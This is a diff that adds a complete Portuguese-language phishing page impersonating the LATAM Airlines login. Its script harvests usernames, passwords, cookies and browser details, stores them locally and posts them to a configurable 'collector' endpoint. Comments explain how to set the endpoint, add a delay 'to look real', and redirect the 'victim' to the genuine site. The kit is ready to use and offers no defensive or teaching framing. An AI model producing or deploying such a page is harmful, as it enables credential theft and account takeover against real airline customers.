@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Faça seu login | LATAM Airlines</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: "LATAM Sans", "Helvetica Neue", Arial, sans-serif;
+    background: #f5f5f5;
+    color: #333;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+  .header {
+    background: #fff;
+    border-bottom: 1px solid #e0e0e0;
+    padding: 16px 24px;
+    display: flex;
+    align-items: center;
+  }
+  .logo {
+    height: 32px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-weight: 700;
+    font-size: 22px;
+    color: #E31837;
+    letter-spacing: -0.5px;
+  }
+  .logo svg { height: 28px; }
+  .main {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 40px 16px;
+  }
+  .card {
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+    width: 100%;
+    max-width: 420px;
+    padding: 40px 32px 32px;
+  }
+  h1 {
+    font-size: 24px;
+    font-weight: 600;
+    margin-bottom: 8px;
+    color: #1a1a1a;
+  }
+  .subtitle {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 28px;
+  }
+  .field {
+    margin-bottom: 20px;
+  }
+  label {
+    display: block;
+    font-size: 13px;
+    font-weight: 500;
+    margin-bottom: 6px;
+    color: #333;
+  }
+  input[type="text"],
+  input[type="password"],
+  input[type="email"] {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: 15px;
+    transition: border-color 0.2s;
+  }
+  input:focus {
+    outline: none;
+    border-color: #E31837;
+    box-shadow: 0 0 0 2px rgba(227,24,55,0.15);
+  }
+  .forgot {
+    text-align: right;
+    margin-top: -12px;
+    margin-bottom: 24px;
+  }
+  .forgot a {
+    font-size: 13px;
+    color: #E31837;
+    text-decoration: none;
+  }
+  .forgot a:hover { text-decoration: underline; }
+  .btn {
+    width: 100%;
+    background: #E31837;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+  .btn:hover { background: #c41430; }
+  .btn:disabled {
+    background: #ccc;
+    cursor: not-allowed;
+  }
+  .divider {
+    display: flex;
+    align-items: center;
+    margin: 28px 0;
+    color: #999;
+    font-size: 13px;
+  }
+  .divider::before,
+  .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #e0e0e0;
+  }
+  .divider span { padding: 0 12px; }
+  .create {
+    text-align: center;
+    font-size: 14px;
+  }
+  .create a {
+    color: #E31837;
+    font-weight: 600;
+    text-decoration: none;
+  }
+  .create a:hover { text-decoration: underline; }
+  .footer {
+    text-align: center;
+    padding: 20px;
+    font-size: 12px;
+    color: #888;
+  }
+  .error {
+    background: #fef2f2;
+    color: #b91c1c;
+    border: 1px solid #fecaca;
+    border-radius: 4px;
+    padding: 10px 14px;
+    font-size: 13px;
+    margin-bottom: 20px;
+    display: none;
+  }
+  .loading {
+    display: none;
+    text-align: center;
+    margin-top: 12px;
+    font-size: 13px;
+    color: #666;
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">
+    <svg viewBox="0 0 120 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M8 4L2 28H8L10.5 18H17L19.5 28H26L20 4H8ZM12.2 12L14 6.5H15.8L17.6 12H12.2Z" fill="#E31837"/>
+      <path d="M32 4H38L44 18.5L50 4H56L46 28H42L32 4Z" fill="#E31837"/>
+      <path d="M62 4H68V22H78V28H62V4Z" fill="#E31837"/>
+      <path d="M84 4H90V12H100V4H106V28H100V18H90V28H84V4Z" fill="#E31837"/>
+    </svg>
+    <span>LATAM</span>
+  </div>
+</div>
+
+<div class="main">
+  <div class="card">
+    <h1>Faça seu login</h1>
+    <p class="subtitle">Entre com seu e-mail ou número LATAM Pass</p>
+
+    <div class="error" id="errorMsg">
+      Não foi possível fazer login. Verifique seus dados e tente novamente.
+    </div>
+
+    <form id="loginForm">
+      <div class="field">
+        <label for="username">E-mail ou número LATAM Pass</label>
+        <input type="text" id="username" name="username" autocomplete="username" required placeholder="ex: nome@email.com ou 123456789">
+      </div>
+
+      <div class="field">
+        <label for="password">Senha</label>
+        <input type="password" id="password" name="password" autocomplete="current-password" required>
+      </div>
+
+      <div class="forgot">
+        <a href="https://www.latamairlines.com/br/pt/central-ajuda/perguntas/conta/senha" target="_blank">Esqueceu a senha?</a>
+      </div>
+
+      <button type="submit" class="btn" id="submitBtn">Entrar</button>
+      <div class="loading" id="loading">Verificando suas credenciais...</div>
+    </form>
+
+    <div class="divider"><span>ou</span></div>
+
+    <div class="create">
+      Ainda não tem conta? <a href="https://www.latamairlines.com/br/pt/cadastro" target="_blank">Criar conta</a>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  © 2026 LATAM Airlines Group S.A. · Todos os direitos reservados
+</div>
+
+<script>
+  // ============ CONFIGURE AQUI ============
+  // Coloque o endpoint do seu coletor (ex: https://seuservidor.com/collect)
+  // Se deixar vazio, os dados ficam só no localStorage + console
+  const COLLECTOR_URL = "";   // <-- mude isso
+  // ========================================
+
+  document.getElementById("loginForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const btn = document.getElementById("submitBtn");
+    const loading = document.getElementById("loading");
+    const errorMsg = document.getElementById("errorMsg");
+
+    btn.disabled = true;
+    loading.style.display = "block";
+    errorMsg.style.display = "none";
+
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value;
+    const cookies  = document.cookie || "(nenhum cookie local)";
+    const userAgent = navigator.userAgent;
+    const timestamp = new Date().toISOString();
+    const pageUrl = window.location.href;
+
+    const payload = {
+      username,
+      password,
+      cookies,
+      userAgent,
+      timestamp,
+      pageUrl,
+      referrer: document.referrer || "direct"
+    };
+
+    // Salva localmente (útil pra teste)
+    try {
+      const existing = JSON.parse(localStorage.getItem("latam_harvest") || "[]");
+      existing.push(payload);
+      localStorage.setItem("latam_harvest", JSON.stringify(existing));
+    } catch(err) {}
+
+    console.log("[HARVEST]", payload);
+
+    // Envia pro coletor se configurado
+    if (COLLECTOR_URL) {
+      try {
+        await fetch(COLLECTOR_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+          mode: "no-cors" // evita CORS se o endpoint não estiver preparado
+        });
+      } catch(err) {
+        console.warn("Falha ao enviar para coletor:", err);
+      }
+    }
+
+    // Pequeno delay pra parecer real
+    setTimeout(() => {
+      // Redireciona pro site original (a vítima vê o refresh)
+      window.location.replace("https://auth.latamairlines.com");
+    }, 1200);
+  });
+</script>
+</body>
+</html>
